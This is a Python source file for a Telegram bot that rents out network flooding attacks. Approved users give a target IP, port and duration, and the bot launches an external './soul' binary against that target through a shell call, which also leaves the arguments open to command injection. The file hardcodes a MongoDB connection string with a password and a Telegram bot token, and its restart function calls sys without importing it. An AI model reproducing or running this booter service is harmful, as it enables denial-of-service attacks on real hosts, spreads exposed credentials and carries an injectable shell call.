import os
import subprocess
import threading
import json
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext
from pymongo import MongoClient
import certifi

# MongoDB connection setup
MONGO_URI = 'mongodb+srv://bittu:bittu@cluster0.ymhyr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['bittu']
approved_users_collection = db['approved_users']

# Admins list
admins = [7735832252]
approved_users = {}
attack_history = {}
active_attacks = {}

# Load approved users from MongoDB
def load_approved_users():
    global approved_users
    approved_users = {}
    for user in approved_users_collection.find():
        approved_users[user['user_id']] = {
            "approved_date": user['approved_date'],
            "expires_on": user['expires_on']
        }

# Save approved user to MongoDB with time-based approval
def save_approved_user(user_id, approved_date, expires_on=None, duration=None, unit='days'):
    if duration is not None:
        # Set the expiration date based on the specified duration
        if unit == 'minutes':
            expires_on = approved_date + timedelta(minutes=duration)
        elif unit == 'hours':
            expires_on = approved_date + timedelta(hours=duration)
        elif unit == 'days':
            expires_on = approved_date + timedelta(days=duration)
        else:
            raise ValueError("Unsupported unit for duration. Use 'minutes', 'hours', or 'days'.")

    # Update MongoDB and local dictionary with user data
    approved_users_collection.update_one(
        {'user_id': user_id},
        {'$set': {
            'user_id': user_id,
            'approved_date': approved_date,
            'expires_on': expires_on
        }},
        upsert=True
    )
    approved_users[user_id] = {
        'approved_date': approved_date,
        'expires_on': expires_on
    }

# Remove approved user from MongoDB
def delete_approved_user(user_id):
    approved_users_collection.delete_one({'user_id': user_id})

# Load users when the bot starts
load_approved_users()

# Function to check if a user's approval has expired
def check_approval(user_id, update: Update):
    if user_id in approved_users:
        current_time = datetime.now()
        expires_on = approved_users[user_id]['expires_on']
        if current_time > expires_on:
            # Remove user from the approved list and notify them
            del approved_users[user_id]
            delete_approved_user(user_id)
            update.message.reply_text("⚠️ Your approval has expired. Please contact an admin for re-approval.")
            return False  # Approval expired
        return True  # Still approved
    else:
        return False  # Not approved

# Start command
def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if check_approval(user_id, update):
        update.message.reply_text("✅ Welcome! You are approved to use the bot. Type /help to see available commands.")
    else:
        update.message.reply_text("❌ Access Denied! You are not approved to use this bot.")

# Help command
def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if check_approval(user_id, update):
        update.message.reply_text("ℹ️ Available Commands:\n"
                                  "/attack <ip> <port> <time> - Start an attack\n"
                                  "/status - View your approval status\n"
                                  "/show_attack - View attack history (Admins only)")
    else:
        update.message.reply_text("❌ Access Denied! You are not approved.")

# Approve command for admins
def approve(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower() if len(context.args) > 2 else 'days'
        approved_date = datetime.now()

        # Approve the user
        save_approved_user(target_id, approved_date, duration=duration, unit=unit)
        update.message.reply_text(f"✅ User {target_id} has been approved for {duration} {unit}.")
    except (IndexError, ValueError):
        update.message.reply_text("⚠️ Usage: /approve <user_id> <duration> <unit (optional: minutes, hours, days)>")

# Disapprove command for admins
def disapprove(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        if target_id in approved_users:
            # Disapprove the user
            delete_approved_user(target_id)
            del approved_users[target_id]
            update.message.reply_text(f"✅ User {target_id} has been disapproved.")
        else:
            update.message.reply_text("⚠️ User is not approved.")
    except (IndexError, ValueError):
        update.message.reply_text("⚠️ Usage: /disapprove <user_id>")

# List approved users (Admin only)
def list_approved(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    if approved_users:
        message = "✅ Approved Users:\n"
        for uid, data in approved_users.items():
            days_left = (data['expires_on'] - datetime.now()).days
            message += f"User ID: {uid}, Days Left: {days_left}\n"
        update.message.reply_text(message)
    else:
        update.message.reply_text("⚠️ No approved users found.")

# Attack command
def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if not check_approval(user_id, update):
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        # Notify attack started
        update.message.reply_text(f"🚀 Attack started on:\nIP: {ip}\nPORT: {port}\nDuration: {duration} seconds")

        # Execute attack command
        command = f"./soul {ip} {port} {duration} 30 653468039956"
        process = subprocess.Popen(command, shell=True)

        # Save attack history
        attack_history.setdefault(str(user_id), []).append({
            "ip": ip, 
            "port": port, 
            "time": duration, 
            "start_time": datetime.now().isoformat()
        })

        # End attack after the specified duration
        def end_attack():
            process.kill()
            update.message.reply_text(f"⚡ Attack ended on:\nIP: {ip}\nPORT: {port}\nDuration: {duration} seconds")
        
        timer = threading.Timer(duration, end_attack)
        timer.start()
        
    except (IndexError, ValueError):
        update.message.reply_text("⚠️ Usage: /attack <ip> <port> <time>")

# Show attack history (Admins only)
def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    message = "📊 Attack History (Last 24 hours):\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.fromisoformat(a['start_time'])).total_seconds() < 86400]
        message += f"User ID: {uid}, Number of Attacks: {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)

# Status command to check approval status
def status(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if not check_approval(user_id, update):
        return
    
    expires_on = approved_users[user_id]['expires_on']
    remaining_time = expires_on - datetime.now()
    days_left = remaining_time.days
    hours_left, remainder = divmod(remaining_time.seconds, 3600)
    minutes_left, _ = divmod(remainder, 60)

    update.message.reply_text(
        f"✅ You are approved.\n"
        f"Approval expires in: {days_left} days, {hours_left} hours, {minutes_left} minutes."
    )

# Restart bot
def restart(update: Update, context: CallbackContext) -> None:
    os.execl(sys.executable, sys.executable, *sys.argv)

# Main function
def main():
    # Set up the updater and dispatcher
    updater = Updater("7942415625:AAG0DZF16t2jkc-4fzE5bSBMxk58xd47uYY", use_context=True)
    dispatcher = updater.dispatcher

    # Register command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove))
    dispatcher.add_handler(CommandHandler("list", list_approved))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))
    dispatcher.add_handler(CommandHandler("status", status))
    dispatcher.add_handler(CommandHandler("restart", restart))

    # Start polling for updates
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
